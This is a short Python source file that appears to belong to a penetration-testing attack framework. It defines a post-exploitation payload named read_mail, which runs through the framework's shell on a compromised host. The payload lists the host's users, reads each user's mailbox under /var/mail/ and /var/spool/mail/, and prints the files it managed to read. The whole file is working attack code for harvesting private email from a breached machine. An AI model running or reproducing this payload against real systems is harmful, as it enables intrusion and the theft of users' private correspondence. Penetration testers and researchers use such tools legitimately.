import re
from plugins.attack.payloads.base_payload import base_payload
from core.ui.consoleUi.tables import table


class read_mail(base_payload):
    '''
    This payload shows local mails stored on /var/mail/
    '''
    def api_read(self, parameters):
        result = {}
        directory_list = []

        directory_list.append('/var/mail/')
        directory_list.append('/var/spool/mail/')

        users = self.exec_payload('users')
        for directory in directory_list:
            for user in users:
                content = self.shell.read( directory+user )
                if content:
                    result[ directory+user ] = content

        return result
        
    def run_read(self, parameters):
        api_result = self.api_read( parameters )
        
        if not api_result:
            return 'No email files could be read.'
        else:
            rows = []
            rows.append( ['Email files'] ) 
            rows.append( [] )
            for filename in api_result:
                rows.append( [filename,] )
                
            result_table = table( rows )
            result_table.draw( 80 )                    
            return